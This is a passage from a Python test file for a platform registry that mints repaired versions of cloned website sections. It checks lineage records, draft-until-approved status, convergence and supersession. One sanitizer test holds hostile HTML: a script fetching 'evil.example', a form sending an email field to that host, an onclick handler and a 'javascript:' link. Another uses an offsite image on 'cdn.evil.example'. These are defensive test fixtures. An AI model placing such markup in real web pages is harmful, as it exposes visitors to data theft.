"""The durable half of the clone-repair ladder (clone-fidelity F3.1, ruling D-F6).

The agent-side walk — the swap, the render, which markup reaches the mint — is pinned against the
real engine in ``apps/agent_runtime/tests/test_web_recreate_and_repair.py``. This file is about
what the REGISTRY does with what it is handed, which is the half that lasts:

* **The identical mint path.** A repair goes through the same sanitizer, the same fail-closed
  reference gate, the same slot detector and the same CSS scoper a harvested clone does. There is
  no relaxed door for markup we composed ourselves — an ``on*`` handler is stripped from a repair
  exactly as it is from a section lifted off somebody's website.
* **The lineage.** ``derived_from`` names the clone this replaces, ``derived_reason`` records the
  ladder rung and the trigger, and both are FROZEN at birth. The original is untouched — still
  approved, still degraded, still pinnable — because it is the evidence of what the source site
  actually did.
* **Born ``draft``.** A producer may not mint into a human's decision (ruling R-I5), so a repair
  is released by the same brand-kit approval every other clone waits on.
* **Convergence is reported.** The id is the content, so a repair byte-identical to a fragment
  this workspace already holds converges onto that row and keeps ITS lineage. Saying so is the
  difference between an honest no-op and a silent lineage overwrite.

DB-backed with the suite's per-test workspace + disposable ``FsStorage``, like its F2.3 neighbour.
"""

from __future__ import annotations

from typing import Any

import pytest
from clue_storage import FsStorage

from lumen_api.agent_cloned_sections import DurableAgentClonedSectionRegistry
from lumen_api.database import FragmentReferenceError
from lumen_api.design_store import DesignBlobStore, HybridRepository
from lumen_api.fragments import (
    FragmentRefused,
    SlotSpec,
    create_web_fragment,
    set_web_fragment_degraded,
    set_web_fragment_status,
)

PAGE = "https://insight.example/"

#: A harvested proof band, born broken: 3200px of measured height with a screenful of content in
#: it. This is exactly the shape the dead-height detector marks at mint.
BROKEN_HTML = (
    '<section class="proof"><h2 class="head">Trusted by 400 clinics</h2>'
    '<p class="body">Three numbers that matter.</p></section>'
)
BROKEN_CSS = ".proof { height: 3200px } .head { color: #123456 }"

#: Exactly what ``detect_slots`` finds on the sanitized form of ``BROKEN_HTML`` — the structural
#: selectors minting stamps, not hand-picked class ones.
BROKEN_SLOTS = (
    SlotSpec(selector="body > *:nth-child(1) > *:nth-child(1)", key="headline", kind="text"),
    SlotSpec(selector="body > *:nth-child(1) > *:nth-child(2)", key="body", kind="text"),
    SlotSpec(selector="body > *:nth-child(1)", key="visible", kind="visibility"),
)

#: What an engine render of a rung-3 replacement looks like: the platform's own class vocabulary,
#: `data-tv` stamps, no inline styling, no foreign references.
REPAIR_HTML = (
    '<section id="sec_repaired" class="w-full py-section">'
    '<div class="mx-auto max-w-5xl px-6 text-center">'
    '<h2 data-tv="h2" class="text-3xl font-semibold text-primary">Trusted by 400 clinics</h2>'
    '<div data-tv="body" class="mt-4 text-base text-muted"><p>Three numbers that matter.</p></div>'
    "</div></section>"
)
REPAIR_CSS = ".text-3xl { font-size: 1.875rem } .text-primary { color: #111827 }"

PNG = b"\x89PNG\r\n\x1a\nfake-preview-bytes"



def _seed_kit(workspace_id: str, kit_id: str = "brand_kit_repair_1") -> dict:
    return HybridRepository(workspace_id=workspace_id).create_brand_kit(
        {"id": kit_id, "version": 3, "name": "Insight", "approval_status": "approved"},
        {},
        [],
        "website",
    )


def _mint_broken(
    workspace_id: str,
    storage: FsStorage,
    *,
    approved: bool = True,
    degraded: bool = True,
    **kwargs: Any,
) -> dict:
    """The harvested original: approved, on the page, and marked broken at mint."""
    row, _artifact = create_web_fragment(
        storage,
        workspace_id=workspace_id,
        html=BROKEN_HTML,
        css=BROKEN_CSS,
        rehosted={},
        source_url=PAGE,
        section_role="proof",
        label="Proof — Trusted by 400 clinics",
        # The slots the DETECTOR finds on this markup, because that is what minting actually
        # stamps (`sections/mint.py` runs `detect_slots` over the sanitized subtree). A
        # hand-picked selector here would make the stored artifact a shape production never
        # produces, and the "did this repair anything?" check compares stored forms.
        slots=BROKEN_SLOTS,
        preview=PNG,
        provenance={
            "page_url": PAGE,
            "section_index": 2,
            "slots": [spec.key for spec in BROKEN_SLOTS],
            "degraded": {"reason": "dead_height", "section_height_px": 3200.0},
        },
        degraded=degraded,
        degraded_reason="dead_height" if degraded else None,
        **kwargs,
    )
    if approved:
        row = set_web_fragment_status(
            workspace_id=workspace_id, fragment_id=row["fragment_id"], status="approved"
        )
    return row


def _mint_other_band(workspace_id: str, storage: FsStorage) -> dict:
    """A second, healthy, UNRELATED band. Different bytes, so a genuinely different fragment."""
    row, _artifact = create_web_fragment(
        storage,
        workspace_id=workspace_id,
        html=BROKEN_HTML.replace("Trusted by 400 clinics", "Featured in"),
        css=BROKEN_CSS,
        rehosted={},
        source_url=PAGE,
        section_role="proof",
        label="Proof — Featured in",
        slots=BROKEN_SLOTS,
        preview=PNG,
        provenance={"page_url": PAGE, "section_index": 3},
    )
    return set_web_fragment_status(
        workspace_id=workspace_id, fragment_id=row["fragment_id"], status="approved"
    )


def _registry(workspace_id: str, storage: FsStorage, cache_dir):
    return DurableAgentClonedSectionRegistry(
        blobs=DesignBlobStore(storage, workspace_id), cache_dir=cache_dir
    )


def _fragment(workspace_id: str, fragment_id: str) -> dict:
    return HybridRepository(workspace_id=workspace_id).require_web_fragment(fragment_id)


# --------------------------------------------------------------------------- #
# The lineage
# --------------------------------------------------------------------------- #


def test_anchor_copy_variant_retains_source_styles_and_does_not_replace_original(
    tmp_path, monkeypatch, _isolated_design_workspace,
) -> None:
    from lumen_api.fragments.registry import read_web_fragment

    workspace_id = _isolated_design_workspace
    storage = FsStorage(tmp_path / "blobs")
    source, _ = create_web_fragment(
        storage, workspace_id=workspace_id,
        html='<section class="hero"><h1>Source title</h1><a class="button" href="/demo">Book a demo<svg><path d="M0 0"></path></svg></a></section>',
        css='.hero{font-size:48px}@media(max-width:600px){.hero{font-size:32px}}',
        source_url=PAGE, section_role="hero", label="Source hero", rehosted={},
        slots=[SlotSpec(selector="h1", key="headline", kind="text")],
    )
    original_id = source["fragment_id"]
    set_web_fragment_status(workspace_id=workspace_id, fragment_id=original_id, status="approved")
    registry = _registry(workspace_id, storage, tmp_path / "cache")
    before = read_web_fragment(storage, workspace_id=workspace_id, fragment_id=original_id).payload
    result = registry.mint_href_repair(
        replaces=original_id, replacements={"/demo": "#workflow"},
        label_replacements={"Book a demo": "Explore the workflow"}, rung=1,
        note="campaign variant: link this page to its workflow explanation",
    )
    changed = read_web_fragment(storage, workspace_id=workspace_id, fragment_id=result["fragment_id"]).payload
    assert result["status"] == "approved"
    assert result["label_match_counts"] == {"Book a demo": 1}
    assert 'Explore the workflow<svg>' in changed["html"]
    assert 'href="#workflow"' in changed["html"]
    assert changed["slot_manifest"] == before["slot_manifest"]
    assert registry.resolve_insertable(original_id)["superseded_by"] is None
    assert read_web_fragment(storage, workspace_id=workspace_id, fragment_id=original_id).payload == before


def test_a_repair_is_a_new_fragment_that_names_the_clone_it_replaces(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    kit = _seed_kit(workspace_id)
    broken = _mint_broken(
        workspace_id,
        design_storage,
        source_kit_id=kit["brand_kit_id"],
        source_kit_version=int(kit["version"]),
    )
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    minted = registry.mint_repair(
        replaces=broken["fragment_id"],
        html=REPAIR_HTML,
        css=REPAIR_CSS,
        rung=3,
        note="3200px of empty navy; this is the same proof copy at its natural height",
    )

    assert minted["fragment_id"] != broken["fragment_id"]
    assert minted["derived_from"] == broken["fragment_id"]
    assert minted["lineage_kept"] is True
    reason = minted["derived_reason"]
    assert "rung 3" in reason
    assert "compact static fallback" in reason
    assert "trigger dead_height" in reason
    assert "3200px of empty navy" in reason
    # Born unreleased, so nothing can put it on a page yet.
    assert minted["status"] == "draft"
    assert minted["insertable"] is False
    # And it inherits the identity that makes it usable in the original's place.
    row = _fragment(workspace_id, minted["fragment_id"])
    assert row["section_role"] == "proof"
    assert row["source_kit_id"] == kit["brand_kit_id"]
    assert row["source_url"] == PAGE
    assert row["label"].startswith("Repaired — ")
    assert row["degraded"] is False


def test_the_repair_inherits_the_page_position_of_the_clone_it_replaces(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """Document order is what makes a recreated page read like the page; a repair keeps its slot."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=2, note="rebuilt"
    )

    provenance = _fragment(workspace_id, minted["fragment_id"])["provenance"]
    assert provenance["page_url"] == PAGE
    assert provenance["section_index"] == 2
    repair = provenance["repair"]
    assert repair["replaces"] == broken["fragment_id"]
    assert repair["rung"] == 2
    assert repair["trigger"] == "dead_height"
    assert repair["source"] == "engine_render"
    # The measured evidence the detector recorded travels with the repair, so a human reviewing
    # the lineage can see what the original was actually accused of.
    assert repair["trigger_evidence"]["section_height_px"] == 3200.0


def test_the_original_survives_its_own_repair_untouched_and_still_pinnable(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """D-F6: the harvested original is IMMUTABLE evidence, not something the repair consumes."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )

    after = _fragment(workspace_id, broken["fragment_id"])
    assert after["status"] == "approved"
    assert after["degraded"] is True
    assert after["degraded_reason"] == "dead_height"
    assert after["payload_digest"] == broken["payload_digest"]
    assert after["derived_from"] is None
    # And the pin gate still accepts it: while it is the only thing released, it is what there is.
    resolved = registry.resolve_insertable(broken["fragment_id"])
    assert resolved["fragment_id"] == broken["fragment_id"]


def test_a_repair_may_not_point_at_a_fragment_this_workspace_does_not_hold(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    with pytest.raises(FragmentRefused) as refusal:
        registry.mint_repair(
            replaces="frag_00000000deadbeef",
            html=REPAIR_HTML,
            css=REPAIR_CSS,
            rung=3,
            note="repairing a ghost",
        )

    assert refusal.value.code == "fragment.unresolved"


@pytest.mark.parametrize("rung", [0, 4])
def test_a_rung_outside_the_ladder_is_refused_before_anything_is_written(
    workspace_id: str, design_storage: FsStorage, tmp_path, rung: int
) -> None:
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    with pytest.raises(ValueError):
        registry.mint_repair(
            replaces=broken["fragment_id"],
            html=REPAIR_HTML,
            css=REPAIR_CSS,
            rung=rung,
            note="off the ladder",
        )

    assert len(registry.list_sections()["sections"]) == 1


# --------------------------------------------------------------------------- #
# The identical mint path
# --------------------------------------------------------------------------- #


def test_a_repair_rides_the_same_sanitizer_a_harvested_clone_does(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """No relaxed door for markup we composed: the D-F4 rules apply to a repair unchanged."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    hostile = (
        '<section id="sec_repaired" class="w-full">'
        '<h2 onclick="steal()" data-lumen-slot="planted">Trusted by 400 clinics</h2>'
        '<script>fetch("//evil.example")</script>'
        '<form action="//evil.example"><input name="email"></form>'
        '<a href="javascript:alert(1)">Book</a>'
        "</section>"
    )

    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=hostile, css=REPAIR_CSS, rung=3, note="fallback"
    )

    from lumen_api.fragments import read_web_fragment

    stored = read_web_fragment(
        design_storage, workspace_id=workspace_id, fragment_id=minted["fragment_id"]
    ).html
    assert "onclick" not in stored
    assert "<script" not in stored
    assert "<form" not in stored
    assert "javascript:" not in stored
    # The visible text of the link survives — only its target was unsafe.
    assert "Book" in stored
    # A source-planted marker never becomes one of ours.
    assert 'data-lumen-slot="planted"' not in stored
    notes = " ".join(minted["sanitizer_notes"])
    assert "onclick" in notes and "script" in notes


def test_a_repair_pointing_at_bytes_we_do_not_hold_refuses_like_any_other_clone(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """The fail-closed reference gate. An artifact that renders a hole is worse than no artifact."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    offsite = (
        '<section id="sec_repaired" class="w-full">'
        '<img src="https://cdn.evil.example/hero.png" alt="">'
        "</section>"
    )

    with pytest.raises(FragmentRefused) as refusal:
        registry.mint_repair(
            replaces=broken["fragment_id"], html=offsite, css=REPAIR_CSS, rung=3, note="fallback"
        )

    assert refusal.value.code == "fragment.unrehosted_reference"
    assert "cdn.evil.example" in (refusal.value.reference or "")


def test_a_repair_gets_its_slots_from_the_same_detector_minting_uses(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """A repair with a different editing surface from the band it replaces would be a new band."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )

    assert "headline" in minted["slot_keys"]
    described = registry.describe([minted["fragment_id"]])[minted["fragment_id"]]
    assert {"key": "headline", "kind": "text"} in described["slots"]


def test_a_repairs_css_is_scoped_under_its_own_wrapper_like_every_other_fragment(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    from lumen_api.fragments import fragment_wrapper_class, read_web_fragment

    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )

    stored = read_web_fragment(
        design_storage, workspace_id=workspace_id, fragment_id=minted["fragment_id"]
    )
    wrapper = fragment_wrapper_class(minted["fragment_id"])
    assert f".{wrapper} .text-3xl" in stored.css
    assert "\n.text-3xl" not in stored.css


# --------------------------------------------------------------------------- #
# Content addressing
# --------------------------------------------------------------------------- #


def test_an_identical_repair_converges_and_says_whose_lineage_the_row_kept(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """First-writer-wins is the price of content addressing; a silent overwrite would be the bug."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    first = registry.mint_repair(
        replaces=broken["fragment_id"],
        html=REPAIR_HTML,
        css=REPAIR_CSS,
        rung=2,
        note="rebuilt as a static proof row",
    )
    second = registry.mint_repair(
        replaces=broken["fragment_id"],
        html=REPAIR_HTML,
        css=REPAIR_CSS,
        rung=3,
        note="a different account of the same bytes",
    )

    assert first["converged"] is False
    assert second["converged"] is True
    assert second["fragment_id"] == first["fragment_id"]
    # The row still records the FIRST repair's rung and words...
    assert second["derived_reason"] == first["derived_reason"]
    assert "rung 2" in second["derived_reason"]
    # ...and the answer says so rather than implying the second call's lineage was written.
    assert second["lineage_kept"] is False
    assert "rung 3" in second["requested_derived_reason"]
    assert _fragment(workspace_id, first["fragment_id"])["derived_reason"] == first[
        "derived_reason"
    ]


def test_a_repair_that_reproduces_the_broken_band_is_refused_rather_than_duplicating_it(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """The hole this closes is specific and easy to miss.

    ``degraded`` is a row-level judgement, not part of the content, and a repair carries no
    preview — so resubmitting the original's own markup would NOT converge onto it. It would mint
    a second, clean-looking fragment holding the same broken band, and the marker would not
    follow. That is the one outcome D-F6 exists to prevent, so it is refused at the door.
    """
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    with pytest.raises(FragmentRefused) as refusal:
        registry.mint_repair(
            replaces=broken["fragment_id"],
            html=BROKEN_HTML,
            css=BROKEN_CSS,
            rung=1,
            note="changed nothing",
        )

    assert refusal.value.code == "fragment.repair_unchanged"
    assert len(registry.list_sections()["sections"]) == 1


# --------------------------------------------------------------------------- #
# The projection the agent reads
# --------------------------------------------------------------------------- #


def test_the_listing_says_a_clone_is_broken_and_names_its_repairs(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """An approved-but-degraded clone offered with no warning is the F3.0 handoff this closes."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    repair = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )

    listed = registry.list_sections()

    (row,) = [
        section
        for section in listed["sections"]
        if section["fragment_id"] == broken["fragment_id"]
    ]
    assert row["degraded"] is True
    assert row["degraded_reason"] == "dead_height"
    assert "artificial scroll height" in row["degraded_note"]
    # The DRAFT repair is named — so nobody composes the same replacement twice — but it is not
    # a substitute, because nothing unreleased can be pinned.
    assert [entry["fragment_id"] for entry in row["repairs"]] == [repair["fragment_id"]]
    assert row["repairs"][0]["status"] == "draft"
    assert row["superseded_by"] is None
    # The draft repair itself is not offered for reuse at all.
    assert repair["fragment_id"] not in [
        section["fragment_id"] for section in listed["sections"]
    ]


def test_a_released_repair_supersedes_the_clone_it_replaces(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    repair = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )
    set_web_fragment_status(
        workspace_id=workspace_id, fragment_id=repair["fragment_id"], status="approved"
    )

    listed = registry.list_sections()
    rows = {section["fragment_id"]: section for section in listed["sections"]}

    assert rows[broken["fragment_id"]]["superseded_by"] == repair["fragment_id"]
    # And the repair now stands on its own too, carrying the lineage that says what it is.
    assert rows[repair["fragment_id"]]["derived_from"] == broken["fragment_id"]
    assert "rung 3" in rows[repair["fragment_id"]]["derived_reason"]
    assert rows[repair["fragment_id"]]["degraded"] is False


def test_an_unbroken_never_repaired_clone_reads_exactly_as_it_did_before(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """The new keys are additive: a healthy section says so in every one of them."""
    healthy = _mint_broken(workspace_id, design_storage, degraded=False)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    (row,) = registry.list_sections()["sections"]

    assert row["fragment_id"] == healthy["fragment_id"]
    assert row["degraded"] is False
    assert row["degraded_reason"] is None
    assert row["degraded_note"] is None
    assert row["derived_from"] is None
    assert row["repairs"] == []
    assert row["superseded_by"] is None


def test_a_degraded_clone_is_still_pinnable_while_it_is_the_only_thing_released(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """D-F6 preserves the evidence; leaving a hole in the page is the other failure."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    resolved = registry.resolve_insertable(broken["fragment_id"])

    assert resolved["fragment_id"] == broken["fragment_id"]
    # ...and the PIN answer says the band is broken, so every door that pins one can say so
    # (ruling R-I4), not only the recreate walk's own listing.
    assert resolved["degraded"] is True
    assert resolved["degraded_reason"] == "dead_height"
    assert "artificial scroll height" in resolved["degraded_note"]
    assert resolved["derived_from"] is None
    with pytest.raises(FragmentReferenceError):
        registry.resolve_insertable("frag_00000000deadbeef")


# --------------------------------------------------------------------------- #
# One section per lineage (ruling R-C1)
# --------------------------------------------------------------------------- #


def _second_repair(
    workspace_id: str,
    design_storage: FsStorage,
    registry,
    *,
    replaces: str,
    marker: str,
    rung: int = 2,
    approve: bool = True,
) -> dict:
    """A second, differently-worded repair, so its bytes (and therefore its id) differ."""
    html = REPAIR_HTML.replace("Three numbers that matter.", marker)
    minted = registry.mint_repair(
        replaces=replaces, html=html, css=REPAIR_CSS, rung=rung, note=marker
    )
    if approve:
        set_web_fragment_status(
            workspace_id=workspace_id, fragment_id=minted["fragment_id"], status="approved"
        )
    return minted


def test_two_released_repairs_of_one_band_are_reported_as_ambiguous_not_ranked(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """Both are somebody's deliberate repair of the same band; ranking them would discard one."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    first = _second_repair(
        workspace_id, design_storage, registry, replaces=broken["fragment_id"], marker="One"
    )
    second = _second_repair(
        workspace_id, design_storage, registry, replaces=broken["fragment_id"], marker="Two"
    )

    rows = {row["fragment_id"]: row for row in registry.list_sections()["sections"]}

    original = rows[broken["fragment_id"]]
    assert original["lineage_root"] == broken["fragment_id"]
    assert original["superseded_by"] is None
    assert sorted(original["lineage_ambiguous"]) == sorted(
        [first["fragment_id"], second["fragment_id"]]
    )
    # And every member of the family answers with the same root, which is what lets an assembly
    # plant the family once however many of its members it meets.
    for fragment_id in (first["fragment_id"], second["fragment_id"]):
        assert rows[fragment_id]["lineage_root"] == broken["fragment_id"]
        assert rows[fragment_id]["lineage_ambiguous"] == original["lineage_ambiguous"]


def test_a_repair_of_a_repair_supersedes_transitively_over_a_degraded_middle(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """The shape that used to put the BROKEN ORIGINAL back on the page beside the healthy repair."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    middle = _second_repair(
        workspace_id, design_storage, registry, replaces=broken["fragment_id"], marker="One"
    )
    set_web_fragment_degraded(
        workspace_id=workspace_id,
        fragment_id=middle["fragment_id"],
        degraded=True,
        reason="dead_height",
    )
    leaf = _second_repair(
        workspace_id, design_storage, registry, replaces=middle["fragment_id"], marker="Two"
    )

    rows = {row["fragment_id"]: row for row in registry.list_sections()["sections"]}

    assert rows[broken["fragment_id"]]["superseded_by"] == leaf["fragment_id"]
    assert rows[middle["fragment_id"]]["superseded_by"] == leaf["fragment_id"]
    assert rows[leaf["fragment_id"]]["superseded_by"] is None
    assert rows[leaf["fragment_id"]]["lineage_root"] == broken["fragment_id"]
    assert rows[broken["fragment_id"]]["lineage_ambiguous"] == []


def test_a_degraded_newest_repair_does_not_supersede_its_own_healthy_parent(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """Ruling N1: a repair nobody should pin supersedes nothing.

    `A(broken) → R1(approved, healthy) → R2(approved, later marked degraded)`. Counting every
    approved child as superseding let R2 knock its own healthy parent out of the leaf set; the
    leaf set emptied and the fallback jumped past R1 to the broken original, so the band D-F6
    marked broken went back on the page while a human-released healthy repair of it sat unused.
    """
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    healthy = _second_repair(
        workspace_id, design_storage, registry, replaces=broken["fragment_id"], marker="One"
    )
    newest = _second_repair(
        workspace_id, design_storage, registry, replaces=healthy["fragment_id"], marker="Two"
    )
    set_web_fragment_degraded(
        workspace_id=workspace_id,
        fragment_id=newest["fragment_id"],
        degraded=True,
        reason="dead_height",
    )

    rows = {row["fragment_id"]: row for row in registry.list_sections()["sections"]}

    assert rows[broken["fragment_id"]]["superseded_by"] == healthy["fragment_id"]
    assert rows[newest["fragment_id"]]["superseded_by"] == healthy["fragment_id"]
    assert rows[healthy["fragment_id"]]["superseded_by"] is None
    assert rows[broken["fragment_id"]]["lineage_ambiguous"] == []
    assert rows[broken["fragment_id"]]["lineage_ranked_over"] == []


def test_a_family_with_no_releasable_version_names_what_the_fallback_passed_over(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """Ruling N4, under FOUNDER RULING R-X4's default: it cannot refuse when every candidate is
    broken, so it states the ranking — and which one it seats is now the toggle's answer.

    The original's row therefore reports ``superseded_by`` (the newest repair took the page,
    flagged) where it used to report ``None`` (it was itself the fallback). Superseded, not
    weakened: the ranking is still stated, and it is still stated on whichever row a caller
    happens to be looking at.
    """
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    for marker in ("One", "Two"):
        repair = _second_repair(
            workspace_id, design_storage, registry, replaces=broken["fragment_id"], marker=marker
        )
        set_web_fragment_degraded(
            workspace_id=workspace_id,
            fragment_id=repair["fragment_id"],
            degraded=True,
            reason="dead_height",
        )

    rows = {row["fragment_id"]: row for row in registry.list_sections()["sections"]}

    original = rows[broken["fragment_id"]]
    # R-X4: the NEWEST approved member is the fallback, so the original points at it...
    assert original["superseded_by"] is not None
    assert original["superseded_by"] != broken["fragment_id"]
    assert original["lineage_ambiguous"] == []
    # ...and the two members it beat — the original itself among them — are named rather than
    # silently dropped, on every row of the family.
    seated = rows[original["superseded_by"]]
    assert len(seated["lineage_ranked_over"]) == 2
    assert broken["fragment_id"] in seated["lineage_ranked_over"]
    assert original["superseded_by"] not in seated["lineage_ranked_over"]
    # And every member says the family is a degraded fallback needing review (R-X4).
    assert seated["lineage_degraded_fallback"] is True
    assert original["lineage_degraded_fallback"] is True


def test_a_healthy_original_is_not_ambiguous_with_its_own_healthy_descendant(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """Ruling R-X1, DB-backed: `A(healthy) → M(broken) → L(healthy)` answers `L`.

    Asking about children rather than descendants made the degraded middle stop shielding its
    ancestors, so `A` and its own grandchild both looked like ends of the chain and the family
    came back ambiguous between them — which refused the whole page and named the original as
    one of its own repairs.
    """
    healthy_original = _mint_broken(workspace_id, design_storage, degraded=False)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    middle = _second_repair(
        workspace_id,
        design_storage,
        registry,
        replaces=healthy_original["fragment_id"],
        marker="One",
    )
    set_web_fragment_degraded(
        workspace_id=workspace_id,
        fragment_id=middle["fragment_id"],
        degraded=True,
        reason="dead_height",
    )
    leaf = _second_repair(
        workspace_id, design_storage, registry, replaces=middle["fragment_id"], marker="Two"
    )

    rows = {row["fragment_id"]: row for row in registry.list_sections()["sections"]}

    assert rows[healthy_original["fragment_id"]]["superseded_by"] == leaf["fragment_id"]
    assert rows[healthy_original["fragment_id"]]["lineage_ambiguous"] == []
    assert rows[middle["fragment_id"]]["superseded_by"] == leaf["fragment_id"]
    assert rows[leaf["fragment_id"]]["superseded_by"] is None


def test_the_pin_gate_does_not_resolve_lineage_for_a_healthy_band(
    workspace_id: str, design_storage: FsStorage, tmp_path, monkeypatch
) -> None:
    """The GATE, not its answer — the round-2 version of this test was mutation-disproved.

    It asserted `superseded_by is None` on a standalone healthy band, which is what an UNGATED
    resolve returns for that fixture too, so deleting `if degraded:` left it green. This counts
    the resolutions instead, which is the thing the gate is: a healthy pin must cost zero.
    """
    from lumen_api import agent_cloned_sections as module

    broken = _mint_broken(workspace_id, design_storage)
    # A DIFFERENT band, and un-degraded. Re-minting the same markup would converge onto the row
    # above (the id is the content) and first-writer-wins would keep its marker — so the "healthy"
    # half of this test would silently be the broken one.
    healthy = _mint_other_band(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    _second_repair(
        workspace_id, design_storage, registry, replaces=broken["fragment_id"], marker="One"
    )

    calls: list[int] = []
    real = module._resolve_lineages
    monkeypatch.setattr(
        module,
        "_resolve_lineages",
        lambda rows: (calls.append(1), real(rows))[1],
    )

    registry.resolve_insertable(healthy["fragment_id"])
    assert calls == []

    registry.resolve_insertable(broken["fragment_id"])
    assert len(calls) == 1


def test_the_pin_gate_resolves_lineage_only_for_a_broken_band(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """Ruling N2: whoever pins a broken band must be able to say whether a repair already exists.

    Gated on ``degraded`` because the verdict costs a row scan and nothing else reads it — a page
    of healthy clones resolves lineage exactly zero times (pinned by the counting test above).
    """
    broken = _mint_broken(workspace_id, design_storage)
    healthy = _mint_other_band(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    repair = _second_repair(
        workspace_id, design_storage, registry, replaces=broken["fragment_id"], marker="One"
    )

    assert registry.resolve_insertable(broken["fragment_id"])["superseded_by"] == (
        repair["fragment_id"]
    )
    # A healthy pin is not looked up at all, and says None rather than a claim it did not make.
    assert registry.resolve_insertable(healthy["fragment_id"])["superseded_by"] is None
    assert registry.resolve_insertable(healthy["fragment_id"])["lineage_ambiguous"] == []


def test_a_lineage_whose_only_repair_is_unreleased_still_points_at_the_original(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """A draft repair supersedes nothing — it cannot be pinned — but it is still NAMED."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    draft = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )

    (row,) = registry.list_sections()["sections"]

    assert row["fragment_id"] == broken["fragment_id"]
    assert row["superseded_by"] is None
    assert [entry["fragment_id"] for entry in row["repairs"]] == [draft["fragment_id"]]


def test_a_dormant_repair_is_never_offered_under_the_band_it_repairs(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """D-F8's rule is absolute, and `repairs` was the one place it was true only by accident."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    hidden = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )
    set_web_fragment_status(
        workspace_id=workspace_id, fragment_id=hidden["fragment_id"], status="deprecated"
    )
    set_web_fragment_status(
        workspace_id=workspace_id, fragment_id=hidden["fragment_id"], status="dormant"
    )

    (row,) = registry.list_sections()["sections"]

    assert row["repairs"] == []
    assert row["superseded_by"] is None


# --------------------------------------------------------------------------- #
# The sealed sheet and the cascade report (ruling R-I1)
# --------------------------------------------------------------------------- #


def test_a_repairs_own_class_vocabulary_is_not_reported_as_lost_styling(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """A repair's sheet is the platform's own vocabulary, so the collision report would fire on
    every released repair — and its claim would be untrue, because the fragment's rules are
    scoped and the "winning" utility carries the same value anyway."""
    from lumen_api.fragments.render import (
